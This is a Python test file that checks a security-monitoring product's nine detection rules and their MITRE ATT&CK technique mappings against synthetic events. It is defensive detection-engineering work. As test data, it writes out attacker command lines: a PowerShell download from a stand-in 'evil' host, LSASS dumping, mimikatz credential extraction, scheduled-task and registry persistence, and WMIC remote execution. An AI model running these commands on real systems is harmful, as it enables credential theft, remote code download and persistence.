"""Detection-coverage regression tests — a purple-team validation loop against
SOC-PARALLAX's own rule-based detection surface (app/detect/signals/rules.py)
and its MITRE ATT&CK mapping (app/detect/mitre.py, backed by mitre.yaml).

Why this exists: mitre.yaml's own header says it plainly — "Rule-based ON
PURPOSE: LLMs hallucinate technique IDs. This file is the single source of
truth." That's a claim about correctness. This file is what actually checks
the claim, per rule, with a real synthetic event and a hardcoded expected
MITRE technique set (not derived from the same mapping being tested — that
would be tautological).

Deliberately offline: rules.evaluate() and mitre.techniques_for() are both
pure (no Postgres/Neo4j), so this needs no live stack, no docker-compose,
nothing beyond `pytest -v` from backend/ — same as the existing test suite,
and runs in the same CI as-is.

Scope: this covers the 9 CONTEXTUAL rules (rules.py) only — the rarity-based
signals in scorer.py need a trained baseline (real historical data) to mean
anything, which is a different, heavier validation problem than "does this
one synthetic event trigger the right rule." Not attempted here.

Each test also carries a negative-control sibling where at least one field
is a plausible-but-non-matching value, so this catches both false negatives
(rule stopped firing) and, where cheap to check, false positives (rule fires
too eagerly).
"""
from __future__ import annotations

import pytest

from app.detect import mitre
from app.detect.signals import rules
from app.ingest.parsers.generic import event_from_record


def _fire(record: dict) -> list[str]:
    """Synthetic record -> UnifiedEvent -> rule names that fired."""
    ev = event_from_record(record)
    return [h.name for h in rules.evaluate(ev)]


def _mitre_ids(signal_name: str) -> set[str]:
    return {ref.technique_id for ref in mitre.techniques_for(signal_name)}


# -- rule:office_spawn_shell -> T1566 (Phishing), T1059.001 (PowerShell) -----

def test_office_spawn_shell_detected():
    fired = _fire({"event_type": "process", "process_name": "powershell.exe",
                   "parent_image": "winword.exe", "cmdline": "powershell.exe -NoP -W Hidden"})
    assert "rule:office_spawn_shell" in fired
    assert _mitre_ids("rule:office_spawn_shell") == {"T1566", "T1059.001"}


def test_office_spawn_shell_negative_control():
    """Same shell, non-Office parent — must not fire this specific rule."""
    fired = _fire({"event_type": "process", "process_name": "powershell.exe",
                   "parent_image": "explorer.exe", "cmdline": "powershell.exe -NoP"})
    assert "rule:office_spawn_shell" not in fired


# -- rule:encoded_powershell -> T1059.001, T1027 (Obfuscated Files) ---------

def test_encoded_powershell_detected():
    fired = _fire({"event_type": "process", "process_name": "powershell.exe",
                   "cmdline": "powershell.exe -enc JABzAD0AT..."})
    assert "rule:encoded_powershell" in fired
    assert _mitre_ids("rule:encoded_powershell") == {"T1059.001", "T1027"}


def test_encoded_powershell_negative_control():
    fired = _fire({"event_type": "process", "process_name": "powershell.exe",
                   "cmdline": "powershell.exe -Command Get-Process"})
    assert "rule:encoded_powershell" not in fired


# -- rule:cmd_download -> T1105 (Ingress Tool Transfer) ----------------------

def test_cmd_download_detected():
    fired = _fire({"event_type": "process", "process_name": "powershell.exe",
                   "cmdline": "powershell -c (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"})
    assert "rule:cmd_download" in fired
    assert _mitre_ids("rule:cmd_download") == {"T1105"}


def test_cmd_download_negative_control():
    fired = _fire({"event_type": "process", "process_name": "powershell.exe",
                   "cmdline": "powershell -c Get-ChildItem C:\\Users"})
    assert "rule:cmd_download" not in fired


# -- rule:lolbin_execution -> T1218 (System Binary Proxy Execution) ---------

def test_lolbin_execution_detected():
    fired = _fire({"event_type": "process", "process_name": "rundll32.exe",
                   "cmdline": "rundll32.exe shell32.dll,ShellExec_RunDLL"})
    assert "rule:lolbin_execution" in fired
    assert _mitre_ids("rule:lolbin_execution") == {"T1218"}


def test_lolbin_execution_negative_control():
    fired = _fire({"event_type": "process", "process_name": "notepad.exe",
                   "cmdline": "notepad.exe C:\\Users\\jdoe\\notes.txt"})
    assert "rule:lolbin_execution" not in fired


# -- rule:suspicious_parent -> T1055 (Process Injection), T1036 (Masquerading)

def test_suspicious_parent_detected():
    fired = _fire({"event_type": "process", "process_name": "cmd.exe",
                   "parent_image": "services.exe", "cmdline": "cmd.exe /c whoami"})
    assert "rule:suspicious_parent" in fired
    assert _mitre_ids("rule:suspicious_parent") == {"T1055", "T1036"}


def test_suspicious_parent_negative_control():
    """Same shell, ordinary parent (explorer.exe) — not in the watched service set."""
    fired = _fire({"event_type": "process", "process_name": "cmd.exe",
                   "parent_image": "explorer.exe", "cmdline": "cmd.exe /c dir"})
    assert "rule:suspicious_parent" not in fired


# -- rule:credential_tool -> T1003 (OS Credential Dumping) ------------------

def test_credential_tool_detected():
    fired = _fire({"event_type": "process", "process_name": "procdump.exe",
                   "cmdline": "procdump.exe -ma lsass.exe lsass.dmp"})
    assert "rule:credential_tool" in fired
    assert _mitre_ids("rule:credential_tool") == {"T1003"}


def test_credential_tool_via_sekurlsa_cmdline_detected():
    """The rule also matches on 'sekurlsa' anywhere in the cmdline, independent
    of which binary is named — worth its own case since it's a second, distinct
    trigger path in the same rule, not just a variant of the first."""
    fired = _fire({"event_type": "process", "process_name": "notarealtool.exe",
                   "cmdline": "notarealtool.exe sekurlsa::logonpasswords"})
    assert "rule:credential_tool" in fired


def test_credential_tool_negative_control():
    fired = _fire({"event_type": "process", "process_name": "taskmgr.exe",
                   "cmdline": "taskmgr.exe"})
    assert "rule:credential_tool" not in fired


# -- rule:scheduled_task -> T1053 (Scheduled Task/Job) -----------------------

def test_scheduled_task_detected():
    fired = _fire({"event_type": "process", "process_name": "schtasks.exe",
                   "cmdline": "schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon"})
    assert "rule:scheduled_task" in fired
    assert _mitre_ids("rule:scheduled_task") == {"T1053"}


def test_scheduled_task_negative_control():
    """schtasks.exe without /create (e.g. a query) must not fire."""
    fired = _fire({"event_type": "process", "process_name": "schtasks.exe",
                   "cmdline": "schtasks.exe /query /tn Updater"})
    assert "rule:scheduled_task" not in fired


# -- rule:remote_exec -> T1021 (Remote Services / lateral movement) --------

def test_remote_exec_detected():
    fired = _fire({"event_type": "process", "process_name": "wmic.exe",
                   "cmdline": "wmic /node:10.0.0.5 process call create \"cmd.exe /c whoami\""})
    assert "rule:remote_exec" in fired
    assert _mitre_ids("rule:remote_exec") == {"T1021"}


def test_remote_exec_negative_control():
    fired = _fire({"event_type": "process", "process_name": "wmic.exe",
                   "cmdline": "wmic os get caption"})
    assert "rule:remote_exec" not in fired


# -- rule:autostart_registry -> T1547 (Boot or Logon Autostart Execution) --
# This rule reads ev.raw["EventData"]["TargetObject"] directly, not a generic
# alias field — event_from_record preserves the whole input dict as .raw, so
# the synthetic record needs that exact nested shape to exercise it for real.

def test_autostart_registry_detected():
    ev = event_from_record({
        "event_type": "registry_set",
        "EventData": {"TargetObject": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater"},
    })
    fired = [h.name for h in rules.evaluate(ev)]
    assert "rule:autostart_registry" in fired
    assert _mitre_ids("rule:autostart_registry") == {"T1547"}


def test_autostart_registry_negative_control():
    ev = event_from_record({
        "event_type": "registry_set",
        "EventData": {"TargetObject": r"HKLM\Software\SomeApp\Settings\Volume"},
    })
    fired = [h.name for h in rules.evaluate(ev)]
    assert "rule:autostart_registry" not in fired


# -- coverage summary ---------------------------------------------------------

ALL_RULE_NAMES = {
    "rule:office_spawn_shell", "rule:encoded_powershell", "rule:cmd_download",
    "rule:lolbin_execution", "rule:suspicious_parent", "rule:credential_tool",
    "rule:scheduled_task", "rule:remote_exec", "rule:autostart_registry",
}


def test_every_rule_in_mitre_yaml_has_a_synthetic_test_above():
    """Guard against silent coverage rot: if someone adds a 10th rule to
    rules.py (and mitre.yaml's signal_map) without a matching test here,
    this fails loudly instead of the gap going unnoticed."""
    yaml_rule_names = {k for k in mitre._rulebook()["signal_map"] if k.startswith("rule:")}
    assert yaml_rule_names == ALL_RULE_NAMES, (
        f"mitre.yaml declares rule signals with no synthetic-event test (or vice versa): "
        f"{yaml_rule_names.symmetric_difference(ALL_RULE_NAMES)}")


@pytest.mark.parametrize("rule_name", sorted(ALL_RULE_NAMES))
def test_every_rule_maps_to_at_least_one_known_technique(rule_name):
    """Every declared rule must resolve to >=1 real MITRE technique — an
    empty mapping would mean a rule can fire but attribute to nothing,
    silently breaking the 'every score traces to a signal' guarantee
    scorer.py's own docstring claims."""
    assert len(_mitre_ids(rule_name)) >= 1
